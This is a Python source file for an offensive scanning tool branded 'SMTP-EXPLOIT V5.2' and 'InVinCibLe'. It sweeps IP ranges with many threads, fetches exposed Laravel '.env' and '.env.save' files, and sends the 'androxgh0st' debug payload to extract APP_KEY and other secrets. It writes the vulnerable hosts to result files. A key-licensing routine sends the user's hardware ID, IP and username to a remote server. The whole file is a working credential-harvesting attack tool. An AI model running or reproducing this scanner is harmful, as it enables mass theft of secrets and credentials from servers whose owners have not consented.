import re
import requests
from colorama import Fore, Back, init
import warnings, threading
import ipaddress
import os
from requests import get
from datetime import datetime, timedelta
import sys


import getpass
import platform
import hashlib
import subprocess
import socket
from datetime import datetime
from colorama import Fore,init,Back


init(autoreset=True)

blue = Fore.LIGHTBLUE_EX
cyan = Fore.LIGHTCYAN_EX
green = Fore.LIGHTGREEN_EX
red = Fore.LIGHTRED_EX
white = Fore.LIGHTWHITE_EX
nored = Fore.RED


authke = '''
\t\t\t\t
\t\t\t\t ▄▄▄       █    ██ ▄▄▄█████▓ ██░ ██  ██ ▄█▀▓█████▓██   ██▓
\t\t\t\t▒████▄     ██  ▓██▒▓  ██▒ ▓▒▓██░ ██▒ ██▄█▒ ▓█   ▀ ▒██  ██▒
\t\t\t\t▒██  ▀█▄  ▓██  ▒██░▒ ▓██░ ▒░▒██▀▀██░▓███▄░ ▒███    ▒██ ██░
\t\t\t\t░██▄▄▄▄██ ▓▓█  ░██░░ ▓██▓ ░ ░▓█ ░██ ▓██ █▄ ▒▓█  ▄  ░ ▐██▓░
\t\t\t\t ▓█   ▓██▒▒▒█████▓   ▒██▒ ░ ░▓█▒░██▓▒██▒ █▄░▒████▒ ░ ██▒▓░
\t\t\t\t ▒▒   ▓▒█░░▒▓▒ ▒ ▒   ▒ ░░    ▒ ░░▒░▒▒ ▒▒ ▓▒░░ ▒░ ░  ██▒▒▒ 
\t\t\t\t  ▒   ▒▒ ░░░▒░ ░ ░     ░     ▒ ░▒░ ░░ ░▒ ▒░ ░ ░  ░▓██ ░▒░ 
\t\t\t\t  ░   ▒    ░░░ ░ ░   ░       ░  ░░ ░░ ░░ ░    ░   ▒ ▒ ░░  
\t\t\t\t      ░  ░   ░               ░  ░  ░░  ░      ░  ░░ ░     
\t\t\t\t                                                  ░ ░     
\t\t\t\t
'''

InVinCibLe1 = '''
\t\t\t\t{}    ____   _   ___      ______ __       _  __
\t\t\t\t{}   /  _/__| | / (_)__  / ___(_) /  ___ | |/_/
\t\t\t\t{}  _/ // _ \ |/ / / _ \/ /__/ / _ \/ -_)>  <  
\t\t\t\t{} /___/_//_/___/_/_//_/\___/_/_.__/\__/_/|_|  
'''.format(blue, cyan, green, red)

crkban = '''{}
\t\t\t\t        SMTP-EXPLOIT V5.2 {} [COMBO-EDITION]
'''.format(white, green)

authban = '''{}
\t\t\t\t  [{}!{}] Authentication Process For Our Official Member
\t\t\t\t  [{}>{}] Your Auth-Key : Ask to {}@theyhates_invincible{}
\t\t\t\t  [{}?{}] Make Sure To Save & Remember Your Auth-Key! {}
'''.format(white, nored, white, nored, white, nored, white, nored, white, white)




def get_hwid():
    system = platform.system()
    if system == "Windows":
        hwid = subprocess.check_output("wmic csproduct get uuid").decode().split("\n")[1].strip()
    elif system == "Linux":
        hwid = subprocess.check_output("cat /var/lib/dbus/machine-id").decode().strip()
    elif system == "Darwin":
        hwid = subprocess.check_output("ioreg -rd1 -c IOPlatformExpertDevice | awk '/IOPlatformUUID/'").decode().split('=')[1].strip().replace('"', '')
    else:
        hwid = "unsupported_os"
    return hashlib.sha256(hwid.encode()).hexdigest()

def get_ip():
    try:
        ip_address = requests.get('https://api.ipify.org').text
    except requests.RequestException:
        ip_address = 'unknown_ip'
    return ip_address

def register_key(key):
    hwid = get_hwid()
    ip = get_ip()
    used_by = getpass.getuser()
    used_at = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    url = "https://pythagorex.com/InVinCibLe/auth.php"
    data = {
        'action': 'register',
        'key': key,
        'hwid': hwid,
        'ip': ip,
        'used_by': used_by,
        'used_at': used_at
    }
    response = requests.post(url, data=data)
    return response.text

def validate_key(key):
    hwid = get_hwid()
    url = "https://pythagorex.com/InVinCibLe/auth.php"
    data = {
        'action': 'validate',
        'key': key,
        'hwid': hwid
    }
    response = requests.post(url, data=data)
    return response.text

def clear_screen():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')


def anwser():
    clear_screen()
    print(Fore.RED + "\t\t\t\t\t" + authke + white)
    print(authban)
    key = input(white + "\n\ninput your key "+ nored + "~# " + white).strip()
    response = register_key(key)
    if "Registration successful!" in response:
        maino()
    elif "Invalid key or key already used." in response:
        validation_response = validate_key(key)
        if "Validation successful!" in validation_response:
            maino()
        else:
            print(validation_response)
    else:
        print(response)

init()

lock = threading.Lock()
fr = Fore.RED
fc = Fore.CYAN
fw = Fore.WHITE
fg = Fore.GREEN
fm = Fore.MAGENTA
fy = Fore.YELLOW
fb = Fore.BLUE

blue = Fore.LIGHTBLUE_EX
cyan = Fore.LIGHTCYAN_EX
green = Fore.LIGHTGREEN_EX
red = Fore.LIGHTRED_EX
white = Fore.LIGHTWHITE_EX
nored = Fore.RED

if not os.path.exists('Result'):
    os.makedirs('Result')

def larachecker(url):
    headers = {'User-agent': 'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30'}
    ori = 'http://' + url
    try:
        get_source = requests.get('http://' + url + '/.env', headers=headers, timeout=1, verify=False, allow_redirects=False).text
        if "APP_KEY" in str(get_source):
            with lock:
                print(f"{cyan}-| {fb}{url} {green} ⟶ {green} [GOOD LARAVEL]")
                with open('Result/good_ips.txt', 'a') as live:
                    live.write(str(ori) + '\n')
                with open('Result/good_env.txt', 'a') as live2:
                    live2.write(str(ori) + '/.env' + '\n')
                
        else:
            get_source3 = requests.post('http://' + url, data={"0x[]": "androxgh0st"}, headers=headers, timeout=1, verify=False, allow_redirects=False).text
            if "<td>APP_KEY</td>" in get_source3:
                with lock:
                    print(f"{cyan}-| {fb}{url} {green} ⟶ {green} [GOOD DEBUG]")
                with open('Result/good_ips.txt', 'a') as live:
                    live.write(str(ori) + '\n')
                with open('Result/good_debug.txt', 'a') as live2:
                    live2.write(str(ori) + '\n')
                
            else:
                get_source5 = requests.get('https://' + url + '/.env', headers=headers, timeout=1, verify=False, allow_redirects=False).text
                if "APP_KEY" in str(get_source5):
                    with lock:
                        print(f"{cyan}-| {fb}{url} {green} ⟶ {green} [GOOD LARAVEL]")
                    with open('Result/good_ips.txt', 'a') as live:
                        live.write(str(ori) + '\n')
                    with open('Result/good_env.txt', 'a') as live2:
                        live2.write(str(ori) + '/.env' + '\n')
                    
                else:
                    get_source6 = requests.post('https://' + url, data={"0x[]": "androxgh0st"}, headers=headers, timeout=1, verify=False, allow_redirects=False).text
                    if "<td>APP_KEY</td>" in get_source6:
                        with lock:
                            print(f"{cyan}-| {fb}{url} {green} ⟶ {green} [GOOD DEBUG]")
                        with open('Result/good_ips.txt', 'a') as live:
                            live.write(str(ori) + '\n')
                        with open('Result/good_debug.txt', 'a') as live2:
                            live2.write(str(ori) + '\n')
                        
                    else:
                        get_source6 = requests.get('http://' + url + '/.env.save', headers=headers, timeout=1, verify=False, allow_redirects=False).text
                        if "APP_KEY" in str(get_source6):
                            with lock:
                                print(f"{cyan}-| {fb}{url} {green} ⟶ {green} [GOOD LARAVEL]")
                            with open('Result/good_ips.txt', 'a') as live:
                                live.write(str(ori) + '\n')
                            with open('Result/good_env.txt', 'a') as live2:
                                live2.write(str(ori) + '\n')
                            
                        else:
                            with lock:
                                print(f"{cyan}-| {fb}{url} {green} ⟶ {red} [BAD LARAVEL]")
    except:
        with lock:
            print(f"{cyan}-| {fb}{url} {green} ⟶ {red} [BAD IP]")
        pass

threads18 = []

def ipsch(ipsmin, ipsmax, th):
    try:
        global threads18
        start_ip = ipaddress.IPv4Address(ipsmin)
        end_ip = ipaddress.IPv4Address(ipsmax)
        for ip_int in range(int(start_ip), int(end_ip)):
            ip = str(ipaddress.IPv4Address(ip_int))
            url = ip
            thread = threading.Thread(target=larachecker, args=(url,))
            threads18.append(thread)
            thread.start()
            if len(threads18) == th:
                for i in threads18:
                    i.join()
                threads18 = []
    except Exception as e:
        print(e)

def maino():
    clear_screen()
    print(InVinCibLe1+'\n\n')
    try:
        file_path = input("[?] Enter list : ")
        with open(file_path, 'r') as file:
            ip_ranges = file.readlines()
        
        th = int(input("[?] Enter Threads : "))
        
        for ips_range in ip_ranges:
            ipsmin, ipsmax = ips_range.split(' - ')
            ipsch(ipsmin.strip(), ipsmax.strip(), th)
    except Exception as e:
        print(f"[x] Error: {e}")

if __name__ == "__main__":
    maino()
